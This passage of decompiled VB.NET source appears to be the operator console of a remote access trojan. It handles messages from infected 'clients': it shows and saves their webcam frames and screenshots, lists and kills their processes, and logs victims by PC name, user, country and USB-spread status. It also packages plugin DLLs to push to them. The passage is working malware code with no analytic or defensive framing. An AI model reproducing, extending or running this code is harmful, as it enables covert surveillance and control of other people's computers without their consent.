                                    Dim item4 As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                                    If (item4.ToolTipText = strArray10(0)) Then
                                        If (strArray10(2) = "*") Then
                                            Dim info4 As New DirectoryInfo(strArray10(0))
                                            item4.Text = strArray10(1)
                                            item4.ToolTipText = (info4.Parent.FullName & "\" & item4.Text)
                                        Else
                                            Dim info5 As New FileInfo(strArray10(0))
                                            item4.Text = strArray10(1)
                                            item4.ToolTipText = (info5.Directory.FullName & Conversions.ToString(CDbl((Conversions.ToDouble("\") * Conversions.ToDouble(item4.Text)))))
                                            item4.SubItems.Item(2).Text = New FileInfo(item4.ToolTipText).Extension.Replace(".", "")
                                        End If
                                    End If
                                Loop
                            Finally
                                If TypeOf enumerator Is IDisposable Then
                                    TryCast(enumerator, IDisposable).Dispose()
                                End If
                            End Try
                            Exit Select
                        Case "ER"
                            fm.SL.Text = ("Error " & strArray(4))
                            Exit Select
                    End Select
                ElseIf (str4 = "CAM") Then
                    If (client.L Is Nothing) Then
                        client.L = New ListViewItem
                    End If
                    Dim cam As cam = DirectCast(ind.Gform(("cam" & client.ip)), cam)
                    Select Case strArray(2)
                        Case "~"
                            If (cam Is Nothing) Then
                                If ind.F.InvokeRequired Then
                                    ind.F.Invoke(New _Req(AddressOf ind.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                                Else
                                    cam = New cam
                                    cam.sk = client
                                    cam.osk = ind.W.GetClient(strArray(1))
                                    cam.Name = ("cam" & client.ip)
                                    Dim num27 As Integer = (strArray.Length - 1)
                                    Dim num15 As Integer = 3
                                    Do While (num15 <= num27)
                                        cam.ComboBox1.SelectedIndex = cam.ComboBox1.Items.Add(strArray(num15))
                                        num15 += 1
                                    Loop
                                    cam.Show()
                                End If
                            Else
                                Dim num28 As Integer = (strArray.Length - 1)
                                Dim num16 As Integer = 3
                                Do While (num16 <= num28)
                                    cam.ComboBox1.SelectedIndex = cam.ComboBox1.Items.Add(strArray(num16))
                                    num16 += 1
                                Loop
                            End If
                            Exit Select
                        Case "!"
                            If (strArray(3) <> "!") Then
                                Dim image2 As Image = Image.FromStream(New MemoryStream(Convert.FromBase64String(strArray(3))))
                                If cam.CheckBox3.Checked Then
                                    Try
                                        image2.Save((cam.folder & My.Computer.Clock.LocalTime.ToString.Replace("/", "").Replace(":", "-") & Conversions.ToString(CInt(Math.Round(CDbl((CDbl(My.Computer.Clock.LocalTime.Millisecond) / 100))))) & ".jpg"))
                                    Catch exception24 As Exception
                                        ProjectData.SetProjectError(exception24)
                                        Dim exception8 As Exception = exception24
                                        ProjectData.ClearProjectError()
                                    End Try
                                End If
                                cam.PictureBox1.Image = image2
                                cam.Text = (cam.QQ & " Size: " & FN.Siz(CLng(strArray(3).Length)))
                            End If
                            If (cam.Button1.Text = "Stop") Then
                                NewLateBinding.LateCall(client, Nothing, "Send", New Object() {Operators.ConcatenateObject((("!" & ind.Y) & Conversions.ToString(cam.ComboBox1.SelectedIndex) & ind.Y), cam.ComboBox2.SelectedItem)}, Nothing, Nothing, Nothing, True)
                            Else
                                client.Send("@")
                            End If
                            Exit Select
                    End Select
                ElseIf (str4 = "proc") Then
                    If (client.L Is Nothing) Then
                        client.L = New ListViewItem
                    End If
                    Dim proc As Proc = DirectCast(ind.Gform(("proc" & client.ip)), Proc)
                    If (proc Is Nothing) Then
                        If ind.F.InvokeRequired Then
                            ind.F.Invoke(New _Req(AddressOf ind.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                            Return
                        End If
                        proc = New Proc
                        proc.sk = client
                        proc.osk = ind.W.GetClient(strArray(1))
                        proc.Name = ("proc" & client.ip)
                        proc.Show()
                    End If
                    If (strArray.Length > 2) Then
                        Select Case strArray(2)
                            Case "pid"
                                proc.ID = Conversions.ToInteger(strArray(3))
                                Return
                            Case "~"
                                proc.L1.Items.Clear()
                                proc.pr.Value = 0
                                proc.pr.Maximum = Conversions.ToInteger(strArray(3))
                                Return
                            Case "!"
                                Dim num29 As Integer = (strArray.Length - 1)
                                Dim num17 As Integer = 3
                                Do While (num17 <= num29)
                                    Try
                                        pr = proc.pr
                                        pr.Value += 1
                                    Catch exception25 As Exception
                                        ProjectData.SetProjectError(exception25)
                                        Dim exception9 As Exception = exception25
                                        ProjectData.ClearProjectError()
                                    End Try
                                    Dim strArray11 As String() = Strings.Split(strArray(num17), ",", -1, CompareMethod.Binary)
                                    Dim item5 As ListViewItem = proc.L1.Items.Add(strArray11(1).ToString, Strings.Split(strArray11(0), "\", -1, CompareMethod.Binary)((Strings.Split(strArray11(0), "\", -1, CompareMethod.Binary).Length - 1)), 0)
                                    item5.SubItems.Add(strArray11(1))
                                    If (Conversions.ToDouble(strArray11(1)) = proc.ID) Then
                                        item5.ForeColor = Color.Red
                                    End If
                                    If strArray11(0).Contains(":\") Then
                                        item5.SubItems.Add(strArray11(0))
                                    Else
                                        item5.SubItems.Add("")
                                    End If
                                    num17 += 1
                                Loop
                                proc.pr.Visible = False
                                proc.L1.FX()
                                proc.L1.ColumnClick(proc.L1, New ColumnClickEventArgs(0))
                                If proc.L1.Columns.Item(0).Text.StartsWith("-") Then
                                    proc.L1.ColumnClick(proc.L1, New ColumnClickEventArgs(0))
                                End If
                                Exit Select
                            Case "RM"
                                proc.SL.Text = (proc.L1.Items.Item(strArray(3)).Text & "[" & strArray(3) & "] Killed")
                                proc.L1.Items.Item(strArray(3)).Remove()
                                Exit Select
                            Case "ER"
                                proc.SL.Text = String.Concat(New String() {"[proc.dll] Error At [", strArray(3), "] MSG=[", strArray(4), "]"})
                                ind.Log(String.Concat(New String() {"[proc.dll] Error At [", strArray(3), "] Client=[", proc.osk.ip, "/", proc.osk.L.Text, "] MSG=[", strArray(4), "]"}))
                                Exit Select
                        End Select
                    End If
                ElseIf (str4 = "lv") Then
                    Dim items As ListViewItemCollection = F.L1.Items
                    Monitor.Enter(items)
                    Try
                        If (Not client.L Is Nothing) Then
                            client.L.Remove()
                        End If
                        client.Folder = (Application.StartupPath & "\Eng_users\")
                        ind.F.L1.SuspendLayout()
                        client.L = ind.F.L1.Items.Add(client.ip, FN.DEB(strArray(1)), 0)
                        client.L.ToolTipText = client.ip
                        client.L.Tag = client
                        client.L.SubItems.Add(Strings.Split(client.ip, ":", -1, CompareMethod.Binary)(0))
                        Dim num30 As Integer = (strArray.Length - 2)
                        Dim num18 As Integer = 2
                        Do While (num18 <= num30)
                            Dim num31 As Integer = num18
                            If (num31 = ind.hac) Then
                                client.L.SubItems.Add(FN.DEB(strArray(num18)))
                            ElseIf (num31 = ind.hco) Then
                                If (ind.F.L1.SmallImageList Is ind.F.IMG2) Then
                                    If Not ind.F.IMG2.Images.ContainsKey((strArray(num18) & ".png")) Then
                                        client.L.ImageKey = "X.png"
                                    Else
                                        client.L.ImageKey = (strArray(num18) & ".png")
                                    End If
                                Else
                                    client.L.ImageKey = "s"
                                End If
                                client.L.SubItems.Add(strArray(num18))
                            Else
                                client.L.SubItems.Add(strArray(num18))
                            End If
                            num18 += 1
                        Loop
                        Dim client2 As Client = client
                        client2.Folder = String.Concat(New String() {client2.Folder, client.L.SubItems.Item(ind.hpc).Text, "_", client.L.SubItems.Item(ind.huser).Text, "_", Strings.Split(client.L.Text, "_", -1, CompareMethod.Binary)((Strings.Split(client.L.Text, "_", -1, CompareMethod.Binary).Length - 1)), "\"})
                        ind.F.L1.ResumeLayout()
                        client.plg.AddRange(Strings.Split(strArray((strArray.Length - 1)), ",", -1, CompareMethod.Binary))
                    Catch exception26 As Exception
                        ProjectData.SetProjectError(exception26)
                        Dim exception10 As Exception = exception26
                        ProjectData.ClearProjectError()
                    Finally
                        Monitor.Exit(items)
                    End Try
                    Try
                        client.pc = DirectCast(Image.FromStream(New MemoryStream(File.ReadAllBytes((client.Folder & "sc.jpg")))), Bitmap)
                    Catch exception27 As Exception
                        ProjectData.SetProjectError(exception27)
                        Dim exception11 As Exception = exception27
                        ProjectData.ClearProjectError()
                    End Try
                    Try
                        Dim bitmap3 As Bitmap
                        If Not ind.F.IMG2.Images.ContainsKey((client.L.SubItems.Item(ind.hco).Text & ".png")) Then
                            bitmap3 = DirectCast(ind.F.IMG2.Images.Item("X.png"), Bitmap)
                        Else
                            bitmap3 = DirectCast(ind.F.IMG2.Images.Item((client.L.SubItems.Item(ind.hco).Text & ".png")), Bitmap)
                        End If
                        ind.nt.Add(bitmap3, client.L.Text, New String() {client.L.SubItems.Item(1).Text, client.L.SubItems.Item(ind.hpc).Text, client.L.SubItems.Item(ind.huser).Text, client.L.SubItems.Item(ind.hos).Text, client.L.SubItems.Item(ind.hco).Text})
                    Catch exception28 As Exception
                        ProjectData.SetProjectError(exception28)
                        Dim exception12 As Exception = exception28
                        ProjectData.ClearProjectError()
                    End Try
                    If (ind.F.L1.Items.Count < 10) Then
                        ind.F.L1.FX()
                    End If
                    ind.Log(("Logged " & client.ip & " " & FN.DEB(strArray(1))))
                    If ind.ensr Then
                        ind.F.L1.EnsureVisible((ind.F.L1.Items.Count - 1))
                    End If
                ElseIf (str4 = "P") Then
                    If ((Not client.L Is Nothing) AndAlso (client.L.SubItems.Count > ind.hping)) Then
                        Dim items2 As ListViewItemCollection = ind.F.L1.Items
                        SyncLock items2
                            client.L.SubItems.Item(ind.hping).Text = (strArray(1) & "ms")
                        End SyncLock
                    End If
                ElseIf (str4 = "bla") Then
                    If client.IsUSB Then
                        client.L.ForeColor = Color.Blue
                    Else
                        client.L.ForeColor = Color.Black
                    End If
                ElseIf (str4 = "~") Then
                    client.Send("~")
                ElseIf (str4 = "ER") Then
                    ind.Log(String.Concat(New String() {"Error From [", client.ip, "/", client.L.Text, "] At [", strArray(1), "] MSG [", strArray(2), "]"}))
                ElseIf (str4 = "!") Then
                    If (Not client Is Nothing) Then
                        Dim iSAd As List(Of Client) = ind.ISAd
                        SyncLock iSAd
                            client.Isend = False
                            If ind.ISAd.Contains(client) Then
                                ind.ISAd.Remove(client)
                            End If
                        End SyncLock
                        If (ind.F.CEL Is client) Then
                            Dim box3 As PictureBox = ind.F.P1
                            SyncLock box3
                                ind.F.CEL = Nothing
                                ind.F.P1.Image = Nothing
                            End SyncLock
                            ind.F.L2.Items.Item(0).SubItems.Item(1).Text = ""
                            ind.F.L2.Items.Item(1).SubItems.Item(1).Text = ""
                            ind.F.L2.Items.Item(2).SubItems.Item(1).Text = ""
                            ind.F.L2.Items.Item(3).SubItems.Item(1).Text = ""
                            ind.F.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.ColumnContent)
                        End If
                        If client.IsUSB Then
                            Dim list4 As List(Of Client) = ind.usb
                            SyncLock list4
                                ind.usb.Remove(client)
                            End SyncLock
                        End If
                        If (Not client.pc Is Nothing) Then
                            client.pc.Dispose()
                            client.pc = Nothing
                        End If
                        client.snf = Nothing
                        client.plg.Clear()
                        If (Not client.L Is Nothing) Then
                            Dim items3 As ListViewItemCollection = ind.F.L1.Items
                            SyncLock items3
                                ind.F.L1.Items.Remove(client.L)
                            End SyncLock
                        End If
                        Try
                            Dim smallImageList As ImageList = ind.F.L1.SmallImageList
                            SyncLock smallImageList
                                ind.F.IMG.Images.RemoveByKey(client.ip)
                            End SyncLock
                        Catch exception29 As Exception
                            ProjectData.SetProjectError(exception29)
                            Dim exception13 As Exception = exception29
                            ProjectData.ClearProjectError()
                        End Try
                    End If
                ElseIf (str4 = "pl") Then
                    Try
                        client.plg.Remove(strArray(1))
                    Catch exception30 As Exception
                        ProjectData.SetProjectError(exception30)
                        Dim exception14 As Exception = exception30
                        ProjectData.ClearProjectError()
                    End Try
                    If (strArray(2).ToString = "0") Then
                        client.plg.Add(strArray(1))
                    Else
                        ind.SendPlug(client, ind.GETPLG(Nothing, strArray(1)), Conversions.ToBoolean(strArray(2)))
                    End If
                ElseIf (str4 = "CAP") Then
                    Dim list6 As List(Of Client) = ind.ISAd
                    SyncLock list6
                        client.Isend = False
                        If ind.ISAd.Contains(client) Then
                            ind.ISAd.Remove(client)
                        End If
                    End SyncLock
                    Dim buffer7 As Byte() = DirectCast(NewLateBinding.LateIndexGet(FN.fx(b, ind.Y), New Object() {1}, Nothing), Byte())
                    client.pc = DirectCast(Image.FromStream(New MemoryStream(buffer7)).Clone, Bitmap)
                    Try
                        If Not Directory.Exists(client.Folder) Then
                            Directory.CreateDirectory(client.Folder)
                        End If
                        NewLateBinding.LateCall(client.pc.Clone, Nothing, "Save", New Object() {(client.Folder & "sc.jpg")}, Nothing, Nothing, Nothing, True)
                    Catch exception31 As Exception
                        ProjectData.SetProjectError(exception31)
                        Dim exception15 As Exception = exception31
                        ProjectData.ClearProjectError()
                    End Try
                    If (ind.F.CEL Is client) Then
                        Dim box4 As PictureBox = ind.F.P1
                        SyncLock box4
                            ind.F.P1.Image = DirectCast(client.pc.Clone, Image)
                        End SyncLock
                    End If
                    Dim list7 As ImageList = ind.F.L1.SmallImageList
                    SyncLock list7
                        If Not ind.F.IMG.Images.ContainsKey(client.ip) Then
                            ind.F.IMG.Images.Add(client.ip, client.pc)
                        Else
                            Dim index As Integer = ind.F.IMG.Images.IndexOfKey(client.ip)
                            ind.F.IMG.Images.Add(client.ip, client.pc)
                            ind.F.IMG.Images.RemoveAt(index)
                        End If
                        If (ind.F.L1.SmallImageList Is ind.F.IMG) Then
                            client.L.ImageKey = ""
                            client.L.ImageKey = client.ip
                        End If
                    End SyncLock
                ElseIf (str4 = "act") Then
                    Dim items4 As ListViewItemCollection = ind.F.L1.Items
                    SyncLock items4
                        If (Not client.L Is Nothing) Then
                            client.L.SubItems.Item(ind.hac).Text = FN.DEB(strArray(1))
                        End If
                    End SyncLock
                End If
            End If
        Catch exception32 As Exception
            ProjectData.SetProjectError(exception32)
            Dim exception16 As Exception = exception32
            If ((strArray(0) = "up") Or (strArray(0) = "dw")) Then
                Try
                    client.Send(("close" & ind.Y & strArray(1)))
                Catch exception33 As Exception
                    ProjectData.SetProjectError(exception33)
                    Dim exception17 As Exception = exception33
                    ProjectData.ClearProjectError()
                End Try
                ProjectData.ClearProjectError()
            Else
                If (strArray(0).ToLower = "cap") Then
                    Dim list8 As List(Of Client) = ind.ISAd
                    SyncLock list8
                        client.Isend = False
                        If ind.ISAd.Contains(client) Then
                            ind.ISAd.Remove(client)
                        End If
                    End SyncLock
                End If
                ind.Log(String.Concat(New String() {"Listner Error At[", strArray(0), "] MSG[", exception16.Message, "]"}))
                ProjectData.ClearProjectError()
            End If
        End Try
    End Sub




End Class


Public Class plg
    Public B As String
    Public Hash As String
    Public Name As String
    ' Methods
    Public Sub New(ByVal fnn As String)
        Dim cM As Boolean = True
        B = Convert.ToBase64String(FN.ZIP(File.ReadAllBytes((Application.StartupPath & "\plugin\" & fnn)), cM))
        Name = fnn
        Hash = FN.getMD5Hash(B)
    End Sub

End Class